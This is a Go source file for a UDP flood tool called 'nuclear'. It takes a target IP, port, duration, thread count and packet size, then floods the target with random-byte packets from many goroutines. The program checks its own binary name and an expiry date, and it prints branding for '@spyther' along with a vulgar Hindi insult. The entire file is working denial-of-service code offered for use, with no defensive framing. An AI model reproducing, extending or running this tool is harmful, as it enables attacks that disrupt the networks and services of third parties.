package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Display a fancy bordered message
func displayMessage(message string) {
	border := "╔════════════════════════════════════════╗"
	bottom := "╚════════════════════════════════════════╝"
	fmt.Println(border)
	lines := strings.Split(message, "\n")
	for _, line := range lines {
		fmt.Printf("║ %-38s ║\n", line)
	}
	fmt.Println(bottom)
}

// Validate binary name
func validateBinaryName(binaryName string) {
	if !strings.HasSuffix(binaryName, "nuclear") {
		displayMessage("INVALID BINARY NAME!\nBinary must be named 'nuclear'")
		os.Exit(1)
	}
}

// Expiry check
func checkBinaryExpiry() {
	expiry := time.Date(2040, 1, 5, 23, 59, 59, 0, time.UTC)
	if time.Now().After(expiry) {
		displayMessage("BINARY EXPIRED!\nContact owner: @spyther")
		os.Exit(1)
	}
}

// IP validation
func validateIP(ip string) {
	if net.ParseIP(ip) == nil {
		displayMessage("INVALID IP ADDRESS: " + ip)
		os.Exit(1)
	}
}

// Generate random payload of desired size
func generatePayload(byteSize int) []byte {
	payload := make([]byte, byteSize)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

// Single attack routine
func attack(ip string, port int, duration int, byteSize int) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Recovered in attack:", r)
		}
	}()

	addr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		fmt.Printf("Failed to connect: %v\n", err)
		return
	}
	defer conn.Close()

	payload := generatePayload(byteSize)
	end := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(end) {
		_, err := conn.Write(payload)
		if err != nil {
			fmt.Printf("Send error: %v\n", err)
			return
		}
	}
}

func main() {
	validateBinaryName(os.Args[0])
	checkBinaryExpiry()

	if len(os.Args) != 6 {
		displayMessage("Usage:\n./nuclear <ip> <port> <duration> <threads> <bytes>")
		os.Exit(1)
	}

	ip := os.Args[1]
	port, err1 := strconv.Atoi(os.Args[2])
	duration, err2 := strconv.Atoi(os.Args[3])
	threads, err3 := strconv.Atoi(os.Args[4])
	bytes, err4 := strconv.Atoi(os.Args[5])

	if err1 != nil || err2 != nil || err3 != nil || err4 != nil {
		displayMessage("ERROR: Invalid arguments. All must be numbers.")
		os.Exit(1)
	}

	validateIP(ip)

	displayMessage("@spyther KA SYSTEM\nCOPY PASTER TERI MAA KA BHOSDA")
	fmt.Printf("Attack started on %s:%d for %d sec with %d threads [%d bytes]\n", ip, port, duration, threads, bytes)

	// Handle Ctrl+C
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\nAttack manually stopped.")
		os.Exit(0)
	}()

	// Time remaining display
	go func() {
		start := time.Now()
		for {
			remaining := duration - int(time.Since(start).Seconds())
			if remaining <= 0 {
				break
			}
			fmt.Printf("\rTime remaining: %d seconds", remaining)
			time.Sleep(1 * time.Second)
		}
		fmt.Print("\rTime remaining: 0 seconds\n")
	}()

	// Launch threads
	for i := 0; i < threads; i++ {
		go attack(ip, port, duration, bytes)
	}

	time.Sleep(time.Duration(duration) * time.Second)
	fmt.Println("Attack finished. Join @spyther")
}